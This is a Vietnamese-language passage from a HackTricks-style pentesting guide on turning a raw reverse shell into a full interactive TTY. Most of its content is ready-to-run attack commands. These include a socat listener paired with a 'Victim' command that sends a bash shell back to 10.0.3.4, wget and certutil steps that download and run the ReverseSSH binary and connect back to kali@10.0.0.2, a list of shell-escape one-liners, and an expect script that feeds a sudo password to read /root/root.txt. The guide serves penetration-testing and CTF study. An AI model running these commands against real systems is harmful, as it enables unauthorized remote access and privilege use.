# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` liệt kê các đường dẫn đến shell đăng nhập hợp lệ và được một số chương trình tham chiếu; đây không phải điều kiện bắt buộc chung để cấp phát PTY.<sup>[[3]](#references)[[4]](#references)</sup> Nếu một chương trình như `pkexec` từ chối `SHELL` với thông báo `The value for the SHELL variable was not found in the /etc/shells file`, hãy đảm bảo đường dẫn shell chính xác (ví dụ: `/bin/bash`) có trong `/etc/shells`.<sup>[[10]](#references)</sup> Chuỗi thao tác khôi phục `CTRL+Z`/`fg` bên dưới sử dụng tính năng điều khiển job của Bash; nếu shell hiện tại không phải Bash, hãy khởi chạy Bash trước khi dùng chuỗi thao tác đó.<sup>[[7]](#references)</sup>

#### Python

`pty.spawn` của Python khởi chạy một chương trình được kết nối với các luồng đầu vào, đầu ra và lỗi tiêu chuẩn của tiến trình hiện tại, nhờ đó Bash có pseudo-terminal trong phiên này.<sup>[[4]](#references)</sup>

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> [!TIP]
> Bạn có thể lấy **số** **hàng** và **cột** bằng cách chạy **`stty -a`**; `-a` in tất cả cài đặt terminal hiện tại. Kết quả của lệnh phụ thuộc vào terminal, vì vậy hãy dùng các giá trị được phiên hiện tại báo cáo.<sup>[[11]](#references)</sup>

#### script

Tiện ích `script` ghi lại phiên terminal; ở đây `/dev/null` loại bỏ bản ghi, `-q` ẩn thông báo bắt đầu và kết thúc, còn `-c` chạy Bash thay vì shell mặc định.<sup>[[5]](#references)</sup>

```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```

Sau một trong hai phương pháp PTY-spawn, hãy tạm dừng phiên Netcat và khôi phục phiên bằng local raw mode, sau đó thiết lập môi trường và kích thước terminal từ xa:

```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### socat

Listener sử dụng terminal hiện tại ở raw mode, tắt local echo và chấp nhận kết nối TCP trên cổng 4444. Lệnh trên máy nạn nhân cấp phát một pty, gộp stderr, tạo session, chuyển tiếp SIGINT và áp dụng các thiết lập terminal phù hợp; thêm `ctty` nếu tiến trình con cần controlling terminal.<sup>[[6]](#references)</sup>

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### **Tạo shell**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (các phiên bản cũ có `--interactive`): `!sh`

Lệnh thoát của Nmap phụ thuộc vào phiên bản: Nmap đã loại bỏ chế độ `--interactive` trong các bản phát hành mới hơn, vì vậy `!sh` chỉ áp dụng cho các phiên bản cũ.<sup>[[13]](#references)</sup>

## ReverseSSH

Một cách thuận tiện để **truy cập shell tương tác**, cũng như **truyền tệp** và **chuyển tiếp cổng**, là tải máy chủ ssh liên kết tĩnh [ReverseSSH](https://github.com/Fahrj/reverse-ssh) lên máy đích.<sup>[[1]](#references)</sup>

Dưới đây là ví dụ cho `x86`, sử dụng binary đã nén bằng UPX do dự án phát hành. Với các kiến trúc hoặc artifact phát hành khác, hãy dùng [trang releases](https://github.com/Fahrj/reverse-ssh/releases/latest/) để tìm bản phù hợp.<sup>[[1]](#references)</sup>

1. Chuẩn bị máy cục bộ để nhận kết nối SSH đến. Trong chế độ listener, `-l` bật listener và `-p 4444` chọn cổng mà nó dùng để chấp nhận kết nối từ máy đích.<sup>[[1]](#references)</sup>

```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```

- (2a) Mục tiêu Linux. Chuyển cùng artifact `upx_reverse-sshx86` đến `/dev/shm/reverse-ssh` và cấp quyền thực thi. `-p 4444` trên mục tiêu chọn cổng listener ở trên, còn `kali@10.0.0.2` cung cấp tài khoản và host dùng để kết nối ngược về.<sup>[[1]](#references)</sup>

```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```

- (2b) Mục tiêu Windows. PowerShell tương tác đầy đủ yêu cầu Windows 10 build 17763; xem [README của dự án](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>

```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```

Ví dụ trên Windows sử dụng `certutil` với `-f -urlcache`; Microsoft mô tả `-f` là buộc tải URL và lưu ý rằng các tham số khả dụng khác nhau tùy phiên bản, vì vậy hãy kiểm tra `certutil -?` nếu không dùng được cú pháp này.<sup>[[12]](#references)</sup>

- Sau khi reverse connection thành công, listener ở chế độ reverse của ReverseSSH mặc định bind port `8888` (hoặc giá trị được cung cấp bằng `-b`), và các kết nối đến chấp nhận mọi username với password mặc định `letmeinbrudipls`. Remote shell chạy với quyền của tài khoản đã khởi chạy `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>

```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```

## Penelope

[Penelope](https://github.com/brightio/penelope) tự động nâng cấp reverse shell trên các hệ điều hành giống Unix lên PTY, thay đổi kích thước terminal trên các hệ điều hành giống Unix và ghi nhật ký tương tác với shell; với shell Windows, công cụ này cung cấp readline nhưng không hỗ trợ thay đổi kích thước terminal theo thời gian thực.<sup>[[2]](#references)</sup>

![Giao diện xử lý reverse shell của Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

Chạy `penelope` để lắng nghe trên `0.0.0.0:4444` theo mặc định; các shell trên hệ điều hành giống Unix kết nối đến sau đó có thể được tự động nâng cấp và ghi nhật ký.<sup>[[2]](#references)</sup>

![Penelope xử lý và nâng cấp shell kết nối đến](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Nếu vì lý do nào đó bạn không thể có được TTY đầy đủ, bạn **vẫn có thể tương tác với các chương trình** cần người dùng nhập dữ liệu. Trong ví dụ sau, Expect khởi chạy `sudo`, chờ lời nhắc nhập mật khẩu, gửi mật khẩu rồi trả lại quyền điều khiển bằng `interact`; `sudo -S` đọc mật khẩu từ đầu vào chuẩn. Chỉ sử dụng cách này trong môi trường lab được cho phép và tránh lưu thông tin xác thực thật trong lịch sử shell hoặc tệp mã nguồn.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```

## References

- [1] [ReverseSSH - Máy chủ ssh liên kết tĩnh có chức năng reverse shell dành cho CTF và các trường hợp tương tự](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler tự động hóa một số việc để sử dụng dễ dàng hơn](https://github.com/brightio/penelope)
- [3] [shells(5) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Tài liệu Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Sổ tay tham khảo Bash — Điều khiển công việc](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nhật ký thay đổi Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
